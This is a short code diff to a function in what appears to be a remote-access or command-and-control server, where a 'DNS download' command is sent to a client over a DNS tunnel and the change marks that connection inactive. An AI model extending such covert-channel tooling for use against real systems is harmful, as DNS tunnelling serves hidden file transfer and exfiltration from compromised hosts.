@@ -131,7 +131,8 @@ def execute_command(ip, command):
     if command[0] == "DNS":
         if command[1] == "download":
             obj.json_send(command)
-            return "Closed Connection - File being downloaded over DNS tunnel"
+            ACTIVE_CONNECTIONS[ip].status = "Inactive"
+            return "Closed Connection - File being downloaded over DNS Tunnel"
         else:
             return "Requested operation doesn't work over DNS tunnel"
 
